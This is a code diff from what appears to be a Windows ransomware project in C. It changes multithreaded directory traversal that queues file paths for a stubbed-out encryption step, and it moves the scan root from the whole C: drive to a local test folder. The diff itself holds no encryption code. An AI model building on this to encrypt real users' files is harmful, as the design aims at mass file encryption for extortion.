@@ -7,25 +7,9 @@
 #include "encrypt.h"
 #include "sync.h"
 
-size_t counter = 0;
 
 void free_str(void *element) {
     free(element);
-}
-
-DWORD WINAPI pop_and_encrypt(LPVOID param) {
-    struct Stack *stack = (struct Stack*)param;
-    while(true) {    
-        wait_sem();
-        lock_mutex();
-        wchar_t *file_path = (wchar_t*)stack_pop(stack);
-        ++counter;
-        unlock_mutex();
-        printf("counter = %zu\n", counter);
-        // work on it
-        //printf("Thread %lu traite le fichier: %ls\n", GetCurrentThreadId(), file_path);
-    }
-    return 0;
 }
 
 int main(void) {
@@ -36,9 +20,8 @@ int main(void) {
     struct Stack *folders_stack = stack_init();
 
     /* THREADS */
-    const int n = 10;
-    HANDLE threads[10];
-    for(int i = 0; i < n; ++i) {
+    HANDLE threads[100];
+    for(int i = 0; i < 100; ++i) {
         threads[i] = CreateThread(
             NULL,
             0,
@@ -50,7 +33,7 @@ int main(void) {
     }
     /* THREADS */
 
-    wchar_t root[] =  L"C:\\";
+    wchar_t root[] =  L"C:\\Users\\mouri\\Documents\\projects\\ransomware\\test\\";
     wchar_t *folder_path;
 
     assert(stack_is_empty(files_stack));
@@ -73,6 +56,7 @@ int main(void) {
         free(folder_path);
     } while(!stack_is_empty(folders_stack));
     end = time(NULL);
+    
     printf("done (files: %zu)\n", files_stack->size);
     printf("Temps écoulé : %lld secondes\n", end - start);
 
@@ -83,7 +67,6 @@ int main(void) {
     assert(stack_is_empty(folders_stack));
     
     stack_free(&folders_stack, free_str);
-    //encrypt_stack(files_stack);
     stack_clear(files_stack, NULL);
     assert(stack_is_empty(files_stack));
 
